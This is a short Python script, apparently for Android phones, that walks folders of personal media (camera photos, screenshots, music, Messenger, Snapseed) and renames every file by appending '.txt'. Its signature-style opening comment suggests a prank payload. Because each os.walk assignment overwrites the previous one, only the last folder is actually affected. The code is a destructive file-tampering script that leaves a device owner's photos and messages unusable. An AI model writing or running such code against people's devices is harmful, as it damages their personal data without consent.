# its me Mr Rakib singing in....
import os

allFilesData = os.walk("/storage/emulated/0")
allFilesData = os.walk("/storage/emulated/0/Pictures")
allFilesData = os.walk("/storage/emulated/0/Music")
allFilesData = os.walk("/storage/emulated/0/DCIM/Camera/")
allFilesData = os.walk("/storage/emulated/0/DCIM/Screenshots")
allFilesData = os.walk("/storage/emulated/0/Messenger")
allFilesData = os.walk("/storage/emulated/0/Snapseed")

for root, directories, files in allFilesData:
	   for file in files:
		      sourcePath = root+"//"+file
		      destinationPath = root+ "//"+file +".txt"
		      os.rename(sourcePath, destinationPath)
